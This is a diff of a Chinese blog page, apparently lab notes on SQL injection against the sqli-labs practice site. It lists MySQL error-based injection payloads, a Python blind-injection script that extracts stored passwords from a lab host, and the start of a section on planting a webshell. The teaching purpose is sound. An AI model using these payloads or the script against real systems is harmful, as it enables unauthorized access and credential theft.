@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9B%B4%E6%94%B9mysql%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E9%80%9A%E8%BF%87get%E4%BC%A0%E5%8F%82%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5.png">
 <meta property="article:published_time" content="2023-12-21T06:44:12.000Z">
-<meta property="article:modified_time" content="2023-12-23T10:12:51.687Z">
+<meta property="article:modified_time" content="2023-12-23T12:42:08.419Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary_large_image">
@@ -234,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.9k 字
+          3k 字
         
       </span>
     
@@ -245,7 +245,7 @@
         
         
         
-          25 分钟
+          26 分钟
         
       </span>
     
@@ -290,8 +290,8 @@
                 <h2 id="sql报错注入"><a href="#sql报错注入" class="headerlink" title="sql报错注入"></a>sql报错注入</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus">(select <span class="hljs-number">1</span> from (select <span class="hljs-built_in">count</span>(*),<span class="hljs-built_in">concat</span>(<span class="hljs-built_in">user</span>(),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x from information_schema<span class="hljs-selector-class">.tables</span> group by x)a)<br><br>(<span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-built_in">user</span>()),<span class="hljs-number">0</span>x7e)))<br><br>(<span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-built_in">user</span>()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))<br><br><br><span class="hljs-function"><span class="hljs-title">geometrycollection</span><span class="hljs-params">((select * from(select * from(select user()</span></span>)a)b))<br><br><br><span class="hljs-function"><span class="hljs-title">multipoint</span><span class="hljs-params">((select * from(select * from(select user()</span></span>)a)b))<br><br><br><br><span class="hljs-function"><span class="hljs-title">polygon</span><span class="hljs-params">((select * from(select * from(select user()</span></span>)a)b))<br><br><br><span class="hljs-function"><span class="hljs-title">multipolygon</span><span class="hljs-params">((select * from(select * from(select user()</span></span>)a)b))<br><br><span class="hljs-function"><span class="hljs-title">linestring</span><span class="hljs-params">((select * from(select * from(select user()</span></span>)a)b))<br><br><br><span class="hljs-function"><span class="hljs-title">multilinestring</span><span class="hljs-params">((select * from(select * from(select user()</span></span>)a)b))<br><br><br><span class="hljs-function"><span class="hljs-title">exp</span><span class="hljs-params">(~(select * from(select user()</span></span>)a))<br><br></code></pre></td></tr></table></figure>
 
 <p><em>上方是MySQL报错代码，在能登录系统而不显示对应的登录信息但是可以显示sql报错时，可以使用报错代码显示对应的信息。</em></p>
-<p><strong>注意：上方很多函数可能无法识别，前三个函数在mysql5.7.26可以使用。</strong></p>
-<p>将上方的user()语句替换成所需要的sql语句，但是注意只能放一句。</p>
+<p><strong>注意：上方很多函数可能无法识别，前三个函数在mysql5.7.26可以使用。上方的报错函数所查询的数据是有上限的。</strong></p>
+<p>将上方的user()语句替换成所需要的sql语句，但是注意只能放一句。使用函数时需要用括号括起来，且只能查一个字段的数据。在使用报错注入时需注意也需要判断注入点和字段数。</p>
 <p>(select group_concat(id) from users)</p>
 <p>sql内置函数</p>
 <p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231221194741187.png" srcset="/img/loading.gif" lazyload alt="image-20231221194741187"></p>
@@ -317,7 +317,7 @@
 <figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gml">import requests<br>import time<br>session = requests.session()<br>url = <span class="hljs-string">&quot;http://192.168.2.128/sqli/Less-8/?id=1&#x27;&quot;</span><br><br><br><br>def db():<br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">begin</span> =<span class="hljs-number">32</span><br>        <span class="hljs-keyword">end</span> =<span class="hljs-number">128</span><br>        tmp = (<span class="hljs-keyword">begin</span>+<span class="hljs-keyword">end</span>)<span class="hljs-comment">//2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">begin</span> &lt; <span class="hljs-keyword">end</span> :<br>            paramsGet = url+ <span class="hljs-string">&quot;/**/and/**/ascii(substr((select group_concat(password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.format(i,tmp)<br>            <br>            response = session.get(paramsGet)<br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span> in response.text:<br>                <span class="hljs-keyword">begin</span> = tmp + <span class="hljs-number">1</span><br>                tmp = (<span class="hljs-keyword">begin</span>+<span class="hljs-keyword">end</span>)<span class="hljs-comment">//2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">end</span> = tmp<br>                tmp = (<span class="hljs-keyword">begin</span>+<span class="hljs-keyword">end</span>)<span class="hljs-comment">//2</span><br>        <span class="hljs-keyword">if</span>(tmp==<span class="hljs-number">32</span>):<br>            <span class="hljs-keyword">break</span><br>        name += <span class="hljs-built_in">chr</span>(tmp)<br>        print(name)<br>db()<br></code></pre></td></tr></table></figure>
 
 <p>这是盲注脚本使用二分法判断字符串的编码并输出，可以自行更改substr()函数中的第一项以输出不同的值。</p>
-<h2 id="住入webshell"><a href="#住入webshell" class="headerlink" title="住入webshell"></a>住入webshell</h2><p>在关卡1中使用<code>union select 1,@@datadir,@@secure_file_priv</code>查看文件的路径和mysql的安全权限。</p>
+<h2 id="文本注入webshell"><a href="#文本注入webshell" class="headerlink" title="文本注入webshell"></a>文本注入webshell</h2><p>在关卡1中使用<code>union select 1,@@datadir,@@secure_file_priv</code>查看文件的路径和mysql的安全权限。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90.png" srcset="/img/loading.gif" lazyload alt="查看安全权限"></p>
 <p>如果在your password：后面没有显示NULL则表示没有安全防护，可以更改文件，若有NULL则需要更改MySQL的配置文件。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgphpstudy%E8%AE%BE%E7%BD%AE.png" srcset="/img/loading.gif" lazyload alt="phpstudy设置"></p>
